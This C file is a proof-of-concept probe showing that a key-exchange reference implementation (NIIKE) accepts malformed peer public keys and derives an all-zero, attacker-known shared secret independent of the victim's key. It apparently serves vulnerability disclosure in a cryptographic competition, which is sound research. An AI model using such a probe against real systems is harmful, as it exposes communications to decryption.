/*
 * NIIKE public-key validation probe (NGCC round-1, KEX/NIKE).
 *
 * Demonstrates that the reference implementation performs NO validation of a
 * received public key: an all-zero / non-canonical / random peer public key is
 * silently accepted (return code 0 = success) and the derived shared secret is
 * the all-zero string, INDEPENDENT of the victim's long-term secret key.
 *
 * Purity: the harness holds the victim key only to run kex_derive_ss on the
 * attacker's chosen peer key; it never inspects the secret. No reference source
 * is modified. Built against the vendor NIIKE-lv128 reference via -I include
 * paths and by linking the reference object files (KAT_KEX.c.o, which carries
 * the reference main(), is excluded).
 *
 * The global drng_algorithm is declared extern in the reference's
 * KEX_AlgorithmInstance.c; the application must define it, which we do here.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "KEX_AlgorithmInstance.h"
#include "drng.h"

DRNG_ctx drng_algorithm;

static int allzero(const unsigned char *b, unsigned long long n) {
    for (unsigned long long i = 0; i < n; i++) if (b[i]) return 0;
    return 1;
}
static void hexhead(const char *tag, const unsigned char *b, unsigned long long n) {
    unsigned long long m = n < 32 ? n : 32;
    printf("%s", tag);
    for (unsigned long long i = 0; i < m; i++) printf("%02x", b[i]);
    if (m < n) printf("...");
    printf("\n");
}

int main(void) {
    unsigned long long pkl = kex_get_pk_len_bytes();
    unsigned long long skl = kex_get_sk_len_bytes();
    unsigned long long ssl = kex_get_ss_len_bytes();
    printf("pk=%llu sk=%llu ss=%llu\n", pkl, skl, ssl);

    unsigned char seed[64];
    for (int i = 0; i < 64; i++) seed[i] = (unsigned char)(i * 7 + 1);
    init_random_number(&drng_algorithm, seed, 64);

    unsigned char *ska = calloc(skl, 1), *pka = calloc(pkl, 1);
    unsigned char *skb = calloc(skl, 1), *pkb = calloc(pkl, 1);
    unsigned char *ss = calloc(ssl, 1);
    unsigned long long a, b, c;

    /* victim's honest static keypair, and an honest peer for reference */
    kex_init_a(pka, &a, ska, &b, NULL, &c);   /* victim  */
    kex_init_b(pkb, &a, skb, &b, NULL, &c);   /* honest peer */

    int fails = 0;
#define RUN(desc, peer) do {                                                   \
        memset(ss, 0, ssl);                                                    \
        int rc = kex_derive_ss_a(ska, skl, (peer), pkl, NULL, 0, NULL, 0,      \
                                 ss, &c);                                      \
        printf("%-30s rc=%d  ss_allzero=%d", desc, rc, allzero(ss, ssl));      \
        if (!allzero(ss, ssl)) { printf("  "); hexhead("ss=", ss, ssl); }      \
        else printf("\n");                                                     \
    } while (0)

    RUN("(0) honest peer", pkb);

    unsigned char *z = calloc(pkl, 1);
    RUN("(1) all-zero peer pk", z);
    if (!allzero(ss, ssl)) fails++;

    unsigned char *ff = malloc(pkl); memset(ff, 0xFF, pkl);
    RUN("(2) all-0xFF (non-canonical)", ff);
    if (!allzero(ss, ssl)) fails++;

    unsigned char *rr = malloc(pkl);
    unsigned long long s = 0x243F6A8885A308D3ULL;
    for (unsigned long long i = 0; i < pkl; i++) { s = s * 6364136223846793005ULL + 1; rr[i] = (unsigned char)(s >> 33); }
    RUN("(3) pseudo-random peer pk", rr);
    if (!allzero(ss, ssl)) fails++;

    unsigned char *fl = malloc(pkl); memcpy(fl, pkb, pkl); fl[100] ^= 1;
    RUN("(4) honest peer, 1 bit flipped", fl);

    /* Independence of the victim secret: a second, unrelated static key also
       derives the all-zero secret for the all-zero peer key. */
    unsigned char seed2[64];
    for (int i = 0; i < 64; i++) seed2[i] = (unsigned char)(200 - i);
    init_random_number(&drng_algorithm, seed2, 64);
    unsigned char *ska2 = calloc(skl, 1), *pka2 = calloc(pkl, 1), *ss2 = calloc(ssl, 1);
    kex_init_a(pka2, &a, ska2, &b, NULL, &c);
    kex_derive_ss_a(ska2, skl, z, pkl, NULL, 0, NULL, 0, ss2, &c);
    printf("(5) 2nd victim + all-zero peer  ss_allzero=%d  (== independent of victim secret)\n",
           allzero(ss2, ssl));

    printf("\nRESULT: malformed peer keys accepted with rc=0 and attacker-known (all-zero) ss: %s\n",
           (fails == 0) ? "CONFIRMED" : "NOT REPRODUCED");
    return 0;
}
